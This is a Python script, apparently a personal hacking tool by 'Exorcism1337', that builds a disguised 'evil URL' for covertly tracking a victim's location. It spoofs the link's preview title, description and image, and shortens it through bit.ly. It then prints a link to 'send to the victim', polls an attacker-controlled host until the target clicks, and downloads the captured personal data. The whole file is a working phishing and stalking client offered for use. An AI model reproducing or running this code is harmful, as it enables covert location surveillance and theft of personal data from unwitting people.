# GPS TRACKER CODED BY ./Exorcism1337
# This is my personal tools
# code your own backend to trace them :p
import sys
import time
import random
import json
import requests
import base64
import os
from pathlib import Path


class Exorcism1337:

    # YOU MUST REGISTER AN ACCOUNT IN bit.ly WEBSITE OR THIS TOOLS WILL NOT WORKING!
    # check your registered account API on bit.ly and paste it here
    # apiv4 is a default url shortener from bitly , because apiv3 is deprecated!
    # tracked victim is the path for the program will write the victim personal data

    api_key = "YOUR_API_KEY"
    apiv4 = "https://api-ssl.bitly.com/v4/bitlinks"
    evil_url = "YOUR_EVIL_URL"
    tracked_victim = evil_url + "tracked_victim/"
    getDetail = evil_url + "getDetail.php"
    updateDetail = evil_url + "updateDetail.php"
    red = "\033[1;31;40m"
    green = "\033[1;32;40m"
    white = "\033[1;37;40m"

    def __init__(self):
        self.tampil()
        self.path()

    def tampil(self):

        print("""\n       ██╗███████╗██╗  ██╗ ██████╗ ██████╗  ██████╗██╗███████╗███╗   ███╗ ██╗██████╗ ██████╗ ███████╗
      ██╔╝██╔════╝╚██╗██╔╝██╔═══██╗██╔══██╗██╔════╝██║██╔════╝████╗ ████║███║╚════██╗╚════██╗╚════██║
     ██╔╝ █████╗   ╚███╔╝ ██║   ██║██████╔╝██║     ██║███████╗██╔████╔██║╚██║ █████╔╝ █████╔╝    ██╔╝
    ██╔╝  ██╔══╝   ██╔██╗ ██║   ██║██╔══██╗██║     ██║╚════██║██║╚██╔╝██║ ██║ ╚═══██╗ ╚═══██╗   ██╔╝
██╗██╔╝   ███████╗██╔╝ ██╗╚██████╔╝██║  ██║╚██████╗██║███████║██║ ╚═╝ ██║ ██║██████╔╝██████╔╝   ██║
╚═╝╚═╝    ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚═╝╚══════╝╚═╝     ╚═╝ ╚═╝╚═════╝ ╚═════╝    ╚═╝
 """)
        print("""
            Author   : ./Exorcism1337 => { Malang Coderz }
	    Contact  : c4tchMe1fY0uC4n@hackermail.com
	    Facebook : https://www.facebook.com/Yudas1337
	    Github   : https://github.com/Yudas1337
	    Version  : 1.0.2 \n""")

        print("Using Api Key : " + self.api_key)

    def performRequest(self, uri, method, data=None, headers=None):
        try:
            method = str(method)
            if method == "post":
                if headers is None:
                    r = requests.post(uri, json=data)
                else:
                    r = requests.post(uri, json=data, headers=headers)

                if r.status_code == 200 or r.status_code == 201:
                    res = r.text
                    return json.loads(res)
            elif method == "get":
                return requests.get(uri)
            else:
                print(f"{self.red}Wrong Method Options")
                sys.exit(0)
        except:
            print(f'{self.red}An Error Occured')
            sys.exit(0)

    def path(self):
        print(f"{self.white}\n\nUsing Default Evil Url : {self.red}" + self.evil_url)
        print(f"{self.white}\nNow Generating Random ID ..")
        time.sleep(5)
        rand = random.randint(123456, 1234567890)
        rand = str(rand)
        print(
            "\n\n  [+] Random ID Created .... \n  [+] ID Tracking : " + rand)
        print(f"  [+] Evil url  : {self.red}" + self.evil_url)
        parameter = input(f"{self.white}  [+] Parameter : ?konten= ")
        time.sleep(3)
        print("\n  Bundling an Evil Url with parameter and ID ..")
        time.sleep(5)
        url = self.evil_url + "?ID=" + rand + "&konten=" + parameter
        print(f"\n  Done => {self.red}" + url)

        self.detailConfiguration(url, parameter, rand)

    def detailConfiguration(self, url, parameter, rand):
        print(f"{self.white}\n*****************************")
        print("1. Edit Metadata Detail")
        print("2. Use Current Metadata")
        print("*****************************")
        options = int(input("Your Choice : "))
        if options == 1:
            self.defineMetaData(url, parameter, rand)
        elif options == 2:
            self.generate_url(self.api_key, self.apiv4, url, parameter, rand)
        else:
            print(f'{self.red}Wrong Options! use your eyes skidz')
            sys.exit(0)

    def defineMetaData(self, url, parameter, rand):
        print("Fetching Metadata...")
        time.sleep(5)
        try:
            r = self.performRequest(self.getDetail, "get")
            if r.status_code == 200:
                res = r.text
                send = json.loads(res)
                title = send['result'][0]['title']
                description = send['result'][0]['description']
                image = send['result'][0]['image']
                print("*****************************")
                print("MetaData Output")
                print("*****************************")
                print("Title       : " + title)
                print("Description : " + description)
                print("Image       : " + image)
                options = str(input("Do you want to update metadata? (Y/N) "))
                if options == "Y":
                    newTitle = input("new Title: ")
                    newDesc = input("new Description: ")
                    newImage = input("Image url : ")
                    data = {
                        "title": newTitle,
                        "description": newDesc,
                        "image": newImage
                    }
                    r = requests.post(self.updateDetail, json=data)
                    if r.status_code == 200:
                        print(f'{self.green}Metadata Updated Successfuly')
                        self.generate_url(self.api_key, self.apiv4,
                                          url, parameter, rand)
                    else:
                        print(f'{self.red}Unexpected Error')
                elif options == "N":
                    self.generate_url(self.api_key, self.apiv4,
                                      url, parameter, rand)
            else:
                print(
                    f'{self.red}Networks Error! Check Your Connection Or the Api Key and Token ( Maybe Deprecated ? ) ')
            sys.exit()

        except KeyboardInterrupt:
            print(f'{self.red}Program Terminated By User')
            sys.exit(0)

    def generate_url(self, api_key, apiv4, url, parameter, rand):
        print(f"{self.white}\n  Generating Evil Url to shorturl from bit.ly \n")
        time.sleep(5)
        try:
            data = {
                "long_url": url
            }
            payload = json.dumps(data)
            hitung = len(payload)
            header = {
                'Authorization': 'Bearer ' + api_key,
                'Content-Type': 'application/json',
                'Content-Length': str(hitung)

            }
            newUrl = self.performRequest(apiv4, "post", data, header)
            shorturl = newUrl['link']
            print(f"  Url Generated! => {self.red}" + shorturl + "\n")
            self.gps_track(shorturl, parameter, rand)
        except KeyboardInterrupt:
            print(f"{self.red}Program Terminated By User")
            sys.exit(0)

    def gps_track(self, shorturl, parameter, rand):
        random = base64.b64encode(rand.encode('utf_16_le')).decode('utf-8')
        clickjack = shorturl+"?ID="+random+"&konten="+parameter
        print(f"{self.white}  Creating Meterpreter ... \n")
        time.sleep(3)
        print(f"  Send to the victim! => {self.green}" + clickjack + "\n\n")
        input(f"{self.white}  Copy the link and press enter to listening .. \n")
        self.listener(rand)

    def listener(self, random):
        try:
            baru = self.tracked_victim + 'GPS_TRACK_' + random + '.html'
            for x in range(999):
                listener = self.performRequest(baru, "get")
                if listener.status_code == 200:
                    print(f"{self.green}\n  Target Clicked The Link!")
                    self.download(baru, random)
                    break
                else:
                    print(
                        f"{self.red}  Listening to the target! ..[" + str(x) + "]")
        except KeyboardInterrupt:
            print(f"{self.red}Program Terminated By User")
            sys.exit(0)

    def download(self, baru, random):
        try:
            print(f"{self.green}\n  Downloading Data ...")
            r = self.performRequest(baru, "get")
            out = r.text
            Path('GPS_TRACK_'+random+'.php').touch()
            fp = open('GPS_TRACK_'+random+'.php', 'w')
            fp.write(out)
            fp.close()
            time.sleep(3)
            print("\n  Opening File...\n")
            time.sleep(3)
            os.system('php -S localhost:1337 GPS_TRACK_' + random + '.php')

        except KeyboardInterrupt:
            print(f"{self.red}Program Terminated By User")
            sys.exit(0)


Exorcism1337()
